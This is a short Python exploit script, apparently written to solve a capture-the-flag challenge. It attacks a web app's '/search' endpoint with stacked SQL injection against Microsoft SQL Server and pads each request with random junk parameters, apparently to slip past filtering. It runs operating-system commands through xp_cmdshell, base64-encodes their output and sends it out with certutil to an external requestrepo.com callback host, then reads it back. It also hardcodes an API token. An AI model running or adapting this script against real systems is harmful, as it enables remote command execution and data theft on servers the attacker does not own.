#!/usr/bin/env python3
import requests, sys, string, random, base64
from requestrepo import Requestrepo
from urllib.parse import urljoin

HOST = sys.argv[1]
wp = lambda x: urljoin(f"http://{HOST}", x)
_s = requests.session()

client = Requestrepo(
    token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3MzI3ODAyNDEsImV4cCI6MTczNTQ1ODY0MSwic3ViZG9tYWluIjoicmFhNHIwNGQifQ.0Oz6XCWAN9xGUZAOQO9EVsAp4KUd_BatgsgoUNUHYWY",
    host="requestrepo.com",
    port=443,
    protocol="https",
)

client.delete_all_requests()

def padding(s):
    return s + "=" * (4 - len(s) % 4)

def exec(inject_query):
    query = "%';{};-- -#".format(inject_query)
    base_params = {
        "".join(random.choices(string.printable, k=5)): "".join(
            random.choices(string.printable, k=10)
        )
        for _ in range(30)
    }
    base_params.update({"query": query})
    return _s.get(wp("/search"), params=base_params).text


def runcmd(cmd):
    p = "declare @r varchar(4120),@cmdOutput varchar(4120);"
    p += "declare @res TABLE(line varchar(4120));"
    p += "insert into @res exec xp_cmdshell '%s';"
    p += "set @cmdOutput=(select (select cast((select line+char(10) COLLATE SQL_Latin1_General_CP1253_CI_AI as 'text()' from @res for xml path('')) as varbinary(max))) for xml path(''),binary base64);"
    p += "set @r=concat('certutil -urlcache -f %s', @cmdOutput);"
    p += "exec xp_cmdshell @r;"

    p = p % (cmd, "http://" + client.domain + "/")
    exec(p)
    new_request = client.get_http_request()
    print(base64.b64decode(padding(new_request.path[1:])).decode())


runcmd("dir")
